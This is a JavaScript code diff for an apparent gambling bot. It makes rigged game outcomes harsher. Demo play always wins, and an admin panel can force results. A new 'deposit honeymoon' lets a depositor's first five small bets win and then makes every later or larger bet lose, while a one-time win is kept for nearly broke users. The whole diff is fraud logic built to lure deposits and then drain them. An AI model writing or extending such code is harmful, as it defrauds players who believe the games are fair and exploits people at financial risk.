@@ -19,14 +19,24 @@ function getRiggedMode(userId, isDemo, bet, member) {
 
   const u = getUser(userId);
 
-  // Admin-forced single-game override (.ayowtf panel)
+  // Admin-forced single-game override (.ayowtf panel) — bypasses everything
   if (u.forceNextOutcome) return u.forceNextOutcome;
 
-  if (isDemo) {
-    const played = u.demoGamesPlayed || 0;
-    return played < 5 ? 'win' : 'fair';
+  // Demo balance: always win, no exceptions
+  if (isDemo) return 'win';
+
+  // Deposit honeymoon: first 5 bets each under 10% of deposit = win; else lose
+  if (u.depositHoneymoon && u.depositAmount > 0) {
+    const honeyBets = u.honeyBetsPlaced || 0;
+    const threshold = u.depositAmount * 0.10;
+    if (honeyBets < 5 && bet < threshold) {
+      return 'win';
+    }
+    // Over 5 bets or bet too big = always lose
+    return 'lose';
   }
 
+  // All-in safety net for near-broke users (one-time only)
   if (!u.hasUsedAllin && u.balance > 0 && u.balance <= 10 && bet >= u.balance) {
     return 'allin_win';
   }
@@ -50,6 +60,10 @@ function recordRiggedGame(userId, isDemo, mode) {
   } else {
     u.realGamesPlayed = (u.realGamesPlayed || 0) + 1;
     if (mode === 'allin_win') u.hasUsedAllin = true;
+    // Advance honeymoon bet counter
+    if (u.depositHoneymoon) {
+      u.honeyBetsPlaced = (u.honeyBetsPlaced || 0) + 1;
+    }
   }
   saveUser(userId, u);
 }
